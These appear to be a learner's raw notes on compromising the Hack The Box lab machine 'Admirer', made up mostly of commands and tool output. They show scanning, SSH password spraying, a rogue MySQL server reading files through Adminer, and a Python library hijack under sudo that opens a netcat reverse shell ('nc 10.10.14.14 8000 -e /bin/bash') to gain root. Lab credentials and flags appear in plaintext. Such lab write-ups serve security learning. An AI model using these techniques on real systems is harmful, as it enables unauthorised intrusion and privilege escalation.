Admirer ip:10.10.10.187


rustscan:
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack


nmap:

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a71e92163699dcbdd84021a2397e1b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaQHjxkc8zeXPgI5C7066uFJaB6EjvTGDEwbfl0cwM95npP9G8icv1F/YQgKxqqcGzl+pVaAybRnQxiZkrZHbnJlMzUzNTxxI5cy+7W0dRZN4VH4YjkXFrZRw6dx/5L1wP4qLtdQ0tLHmgzwJZO+111mrAGXMt0G+SCnQ30U7vp95EtIC0gbiGDx0dDVgMeg43+LkzWG+Nj+mQ5KCQBjDLFaZXwCp5Pqfrpf3AmERjoFHIE8Df4QO3lKT9Ov1HWcnfFuqSH/pl5+m83ecQGS1uxAaokNfn9Nkg12dZP1JSk+Tt28VrpOZDKhVvAQhXWONMTyuRJmVg/hnrSfxTwbM9
|   256 c595b6214d46a425557a873e19a8e702 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNHgxoAB6NHTQnBo+/MqdfMsEet9jVzP94okTOAWWMpWkWkT+X4EEWRzlxZKwb/dnt99LS8WNZkR0P9HQxMcIII=
|   256 d02dddd05c42f87b315abe57c4a9a756 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqp21lADoWZ+184z0m9zCpORbmmngq+h498H9JVf7kP
80/tcp open  http    syn-ack Apache httpd 2.4.25 ((Debian))
|_http-title: Admirer
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


nikto:
nikto -h 10.10.10.187
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.10.187
+ Target Hostname:    10.10.10.187
+ Target Port:        80
+ Start Time:         2023-05-08 15:17:47 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /robots.txt: contains 1 entry which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8049 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2023-05-08 15:25:21 (GMT3) (454 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested



gobuster:

obuster dir -u http://admirer.htb -w /usr/share/wordlists/dirb/common.txt -t 64
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admirer.htb
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/08 15:22:02 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 311] [--> http://admirer.htb/assets/]
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 311] [--> http://admirer.htb/images/]
/index.php            (Status: 200) [Size: 6051]
/robots.txt           (Status: 200) [Size: 138]
/server-status        (Status: 403) [Size: 276]
Progress: 4170 / 4615 (90.36%)
===============================================================
2023/05/08 15:22:17 Finished
===============================================================


RObots.txt:

User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir

 gobuster dir -u http://admirer.htb/admin-dir/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -x txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admirer.htb/admin-dir/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2023/05/08 15:30:44 Starting gobuster in directory enumeration mode
===============================================================
/contacts.txt         (Status: 200) [Size: 350]
/credentials.txt      (Status: 200) [Size: 136]
Progress: 440777 / 441122 (99.92%)
===============================================================
2023/05/08 15:37:20 Finished
===============================================================


contacts.txt:

##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb



credentials.txt:

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!



with the credentials found for ftp,we log in and we download 2 files:

 ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:gabriel.hajdu): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||28876|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
ftp> get dump sql
local: sql remote: dump
229 Entering Extended Passive Mode (|||22931|)
550 Failed to open file.
ftp> binary
200 Switching to Binary mode.
ftp> get dump.sql
local: dump.sql remote: dump.sql
229 Entering Extended Passive Mode (|||51833|)
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
100% |************************************************************************************************************************************************************************************************|  3405        0.31 KiB/s    00:00 ETA
226 Transfer complete.
3405 bytes received in 00:10 (0.30 KiB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
229 Entering Extended Passive Mode (|||16665|)
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
100% |************************************************************************************************************************************************************************************************|  5147 KiB    1.24 MiB/s    00:00 ETA
226 Transfer complete.
5270987 bytes received in 00:04 (1.23 MiB/s)
ftp> quit
221 Goodbye.




gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Admirer]
└─$ crackmapexec ssh 10.10.10.187 -u user.txt -p passwords.txt 
SSH         10.10.10.187    22     10.10.10.187     [*] SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
SSH         10.10.10.187    22     10.10.10.187     [-] waldo:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] waldo:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] waldo:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] waldo:Wh3r3_1s_w4ld0? Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] waldo:]F7jLHw:*G>UPrTo}~A"d6b Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] penny:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] penny:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] penny:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] penny:Wh3r3_1s_w4ld0? Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] penny:]F7jLHw:*G>UPrTo}~A"d6b Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] rajesh:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] rajesh:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] rajesh:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] rajesh:Wh3r3_1s_w4ld0? Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] rajesh:]F7jLHw:*G>UPrTo}~A"d6b Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] amy:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] amy:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] amy:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] amy:Wh3r3_1s_w4ld0? Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] amy:]F7jLHw:*G>UPrTo}~A"d6b Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] leonard:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] leonard:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] leonard:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] leonard:Wh3r3_1s_w4ld0? Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] leonard:]F7jLHw:*G>UPrTo}~A"d6b Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] howard:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] howard:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] howard:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] howard:Wh3r3_1s_w4ld0? Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] howard:]F7jLHw:*G>UPrTo}~A"d6b Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] bernadette:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] bernadette:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] bernadette:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] bernadette:Wh3r3_1s_w4ld0? Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] bernadette:]F7jLHw:*G>UPrTo}~A"d6b Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] admin:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] admin:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] admin:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] admin:Wh3r3_1s_w4ld0? Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] admin:]F7jLHw:*G>UPrTo}~A"d6b Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] root:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] root:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] root:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] root:Wh3r3_1s_w4ld0? Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] root:]F7jLHw:*G>UPrTo}~A"d6b Authentication failed.



gobuster dir -u http://admirer.htb/utility-scripts/ -w /home/gabriel.hajdu/SecLists/Discovery/Web-Content/big.txt -t 64 -x php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admirer.htb/utility-scripts/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /home/gabriel.hajdu/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/05/08 16:24:20 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/adminer.php          (Status: 200) [Size: 4292]
/info.php             (Status: 200) [Size: 83757]
/phptest.php          (Status: 200) [Size: 32]
Progress: 40834 / 40954 (99.71%)
===============================================================
2023/05/08 16:24:57 Finished
===============================================================


http://admirer.htb/utility-scripts/adminer.php

we have a mysql login page

sudo bettercap 
[sudo] password for gabriel.hajdu: 
bettercap v2.32.0 (built for linux amd64 with go1.19.8) [type 'help' for a list of commands]

[16:38:50] [sys.log] [inf] gateway monitor started ...
192.168.0.0/24 > 192.168.0.136  » set mysql.server.address 10.10.14.14
192.168.0.0/24 > 192.168.0.136  » set mysql.server.infile ../index.php
192.168.0.0/24 > 192.168.0.136  » mysql.server on
192.168.0.0/24 > 192.168.0.136  » [16:39:24] [sys.log] [inf] mysql.server server starting on address 10.10.14.14:3306
192.168.0.0/24 > 192.168.0.136  » [16:40:09] [sys.log] [inf] mysql.server connection from 10.10.10.187
192.168.0.0/24 > 192.168.0.136  » [16:40:09] [sys.log] [inf] mysql.server can use LOAD DATA LOCAL: 1
192.168.0.0/24 > 192.168.0.136  » [16:40:09] [sys.log] [inf] mysql.server login request username: 
192.168.0.0/24 > 192.168.0.136  » [16:40:09] [sys.log] [inf] mysql.server read file ( ../index.php ) is 2647 bytes
192.168.0.0/24 > 192.168.0.136  » [16:40:09] [sys.log] [inf] mysql.server 
<!DOCTYPE HTML>
<!--
	Multiverse by HTML5 UP
	html5up.net | @ajlkn
	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html>
	<head>
		<title>Admirer</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="assets/css/main.css" />
		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
	</head>
	<body class="is-preload">

		<!-- Wrapper -->
			<div id="wrapper">

				<!-- Header -->
					<header id="header">
						<h1><a href="index.html"><strong>Admirer</strong> of skills and visuals</a></h1>
						<nav>
							<ul>
								<li><a href="#footer" class="icon solid fa-info-circle">About</a></li>
							</ul>
						</nav>
					</header>

				<!-- Main -->
					<div id="main">			
					 <?php
                        $servername = "localhost";
                        $username = "waldo";
                        $password = "&<h5b~yK3F#{PaPB&dA}{H>";
                        $dbname = "admirerdb";

                        // Create connection
                        $conn = new mysqli($servername, $username, $password, $dbname);
                        // Check connection
                        if ($conn->connect_error) {
                            die("Connection failed: " . $conn->connect_error);
                        }

                        $sql = "SELECT * FROM items";
                        $result = $conn->query($sql);

                        if ($result->num_rows > 0) {
                            // output data of each row
                            while($row = $result->fetch_assoc()) {
                                echo "<article class='thumb'>\n";
    							echo "<a href='".$row["image_path"]."' class='image'><img src='".$row["thumb_path"]."' alt='' /></a>\n";
	    						echo "<h2>".$row["title"]."</h2>\n";
	    						echo "<p>".$row["text"]."</p>\n";
	    					    echo "</article>\n";
                            }
                        } else {
                            echo "0 results";
                        }
                        $conn->close();
                    ?>
					</div>

				<!-- Footer -->
					<footer id="footer" class="panel">
						<div class="inner split">
							<div>
								<section>
									<h2>Allow yourself to be amazed</h2>
									<p>Skills are not to be envied, but to feel inspired by.<br>
									Visual arts and music are there to take care of your soul.<br><br>
									Let your senses soak up these wonders...<br><br><br><br>
									</p>
								</section>
								<section>
								
192.168.0.0/24 > 192.168.0.136  » [16:40:10] [sys.log] [inf] mysql.server connection from 10.10.10.187
192.168.0.0/24 > 192.168.0.136  » [16:40:10] [sys.log] [inf] mysql.server can use LOAD DATA LOCAL: 1
192.168.0.0/24 > 192.168.0.136  » [16:40:10] [sys.log] [inf] mysql.server login request username: 
192.168.0.0/24 > 192.168.0.136  » [16:40:10] [sys.log] [inf] mysql.server read file ( ../index.php ) is 4622 bytes
192.168.0.0/24 > 192.168.0.136  » [16:40:10] [sys.log] [inf] mysql.server 
<!DOCTYPE HTML>
<!--
	Multiverse by HTML5 UP
	html5up.net | @ajlkn
	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html>
	<head>
		<title>Admirer</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="assets/css/main.css" />
		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
	</head>
	<body class="is-preload">

		<!-- Wrapper -->
			<div id="wrapper">

				<!-- Header -->
					<header id="header">
						<h1><a href="index.html"><strong>Admirer</strong> of skills and visuals</a></h1>
						<nav>
							<ul>
								<li><a href="#footer" class="icon solid fa-info-circle">About</a></li>
							</ul>
						</nav>
					</header>

				<!-- Main -->
					<div id="main">			
					 <?php
                        $servername = "localhost";
                        $username = "waldo";
                        $password = "&<h5b~yK3F#{PaPB&dA}{H>";
                        $dbname = "admirerdb";

                        // Create connection
                        $conn = new mysqli($servername, $username, $password, $dbname);
                        // Check connection
                        if ($conn->connect_error) {
                            die("Connection failed: " . $conn->connect_error);
                        }

                        $sql = "SELECT * FROM items";
                        $result = $conn->query($sql);

                        if ($result->num_rows > 0) {
                            // output data of each row
                            while($row = $result->fetch_assoc()) {
                                echo "<article class='thumb'>\n";
    							echo "<a href='".$row["image_path"]."' class='image'><img src='".$row["thumb_path"]."' alt='' /></a>\n";
	    						echo "<h2>".$row["title"]."</h2>\n";
	    						echo "<p>".$row["text"]."</p>\n";
	    					    echo "</article>\n";
                            }
                        } else {
                            echo "0 results";
                        }
                        $conn->close();
                    ?>
					</div>

				<!-- Footer -->
					<footer id="footer" class="panel">
						<div class="inner split">
							<div>
								<section>
									<h2>Allow yourself to be amazed</h2>
									<p>Skills are not to be envied, but to feel inspired by.<br>
									Visual arts and music are there to take care of your soul.<br><br>
									Let your senses soak up these wonders...<br><br><br><br>
									</p>
								</section>
								<section>
									<h2>Follow me on ...</h2>
									<ul class="icons">
										<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
										<li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li>
										<li><a href="#" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li>
										<li><a href="#" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
										<li><a href="#" class="icon brands fa-dribbble"><span class="label">Dribbble</span></a></li>
										<li><a href="#" class="icon brands fa-linkedin-in"><span class="label">LinkedIn</span></a></li>
									</ul>
								</section>
							</div>
							<div>
								<section>
									<h2>Get in touch</h2>
									<form method="post" action="#"><!-- Still under development... This does not send anything yet, but it looks nice! -->
										<div class="fields">
											<div class="field half">
												<input type="text" name="name" id="name" placeholder="Name" />
											</div>
											<div class="field half">
												<input type="text" name="email" id="email" placeholder="Email" />
											</div>
											<div class="field">
												<textarea name="message" id="message" rows="4" placeholder="Message"></textarea>
											</div>
										</div>
										<ul class="actions">
											<li><input type="submit" value="Send" class="primary" /></li>
											<li><input type="reset" value="Reset" /></li>
										</ul>
									</form>
								</section>
							</div>
						</div>
					</footer>

			</div>

		<!-- Scripts -->
			<script src="assets/js/jquery.min.js"></script>
			<script src="assets/js/jquery.poptrox.min.js"></script>
			<script src="assets/js/browser.min.js"></script>
			<script src="assets/js/breakpoints.min.js"></script>
			<script src="assets/js/util.js"></script>
			<script src="assets/js/main.js"></script>

	</body>
</ht
192.168.0.0/24 > 192.168.0.136  »  



┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Admirer]
└─$ crackmapexec ssh 10.10.10.187 -u user.txt -p passwords.txt 
SSH         10.10.10.187    22     10.10.10.187     [*] SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
SSH         10.10.10.187    22     10.10.10.187     [-] waldo:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] waldo:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] waldo:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] waldo:Wh3r3_1s_w4ld0? Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] waldo:]F7jLHw:*G>UPrTo}~A"d6b Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] waldo:Ezy]m27}OREc$ Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [+] waldo:&<h5b~yK3F#{PaPB&dA}{H> 



waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ pwd
/home/waldo
waldo@admirer:~$ cat user.txt
15a9fc4b9d28ab7938e7f50a0913eb2b
waldo@admirer:~$ 



[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh


waldo@admirer:/opt/scripts$ cat admin_tasks.sh 
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done




waldo@admirer:~$ cd /dev/shm
waldo@admirer:/dev/shm$ ls
waldo@admirer:/dev/shm$ nano shutil.py
waldo@admirer:/dev/shm$ cat shutil.py 
import os
def make_archive(h, t, b):
os.system('nc 10.10.14.14 8000 -e "/bin/bash"')
waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 6
[sudo] password for waldo: 
Running backup script in the background, it might take a while...
waldo@admirer:/dev/shm$ Traceback (most recent call last):
  File "/opt/scripts/backup.py", line 3, in <module>
    from shutil import make_archive
  File "/dev/shm/shutil.py", line 3
    os.system('nc 10.10.14.14 8000 -e "/bin/bash"')
     ^
IndentationError: expected an indented block

waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
waldo@admirer:/dev/shm$ 





gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Admirer]
└─$ ufw allow from 10.10.10.187 to any port 8000
ERROR: You need to be root to run this script

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Admirer]
└─$ sudo ufw allow from 10.10.10.187 to any port 8000
Rules updated

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Admirer]
└─$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.187] 49954
whoami
root
cd /root
ls
root.txt
cat root.txt
f7fe6f2703f77c1714b10869f7d10f16
